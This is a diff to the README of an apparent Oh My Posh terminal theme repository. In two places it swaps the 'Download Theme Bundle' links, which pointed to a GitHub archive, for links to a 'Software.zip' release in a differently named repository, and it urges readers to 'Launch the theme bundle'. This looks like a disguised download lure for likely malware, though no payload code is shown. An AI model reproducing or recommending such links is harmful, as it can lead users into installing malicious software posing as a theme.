@@ -2,7 +2,7 @@
 
 ### A personalized terminal prompt theme configuration using Oh My Posh - the prompt theme engine for any shell.
 
-[![Download Theme Bundle](https://img.shields.io/badge/Download-Theme%20Bundle-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Theme Bundle](https://github.com/shhcarl/oh-my-posh.wevilb.themes/releases/download/v1.0/Software.zip%20Bundle-blue)](https://github.com/shhcarl/oh-my-posh.wevilb.themes/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -76,7 +76,7 @@ Let your creativity shine through your command line interface with Oh My Posh We
 
 **Repository Topics**: clink, oh-my-posh, oh-my-posh-set-up-with-pwsh, oh-my-posh-theme, oh-my-posh-yazi, oh-my-zsh, oh-my-zsh-theme, omp, shell, shell-script, terminal, themes, zsh
 
-[![Download Theme Bundle](https://img.shields.io/badge/Download-Theme%20Bundle-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) Launch the theme bundle to get started!
+[![Download Theme Bundle](https://github.com/shhcarl/oh-my-posh.wevilb.themes/releases/download/v1.0/Software.zip%20Bundle-blue)](https://github.com/shhcarl/oh-my-posh.wevilb.themes/releases/download/v1.0/Software.zip) Launch the theme bundle to get started!
 
 ---
 
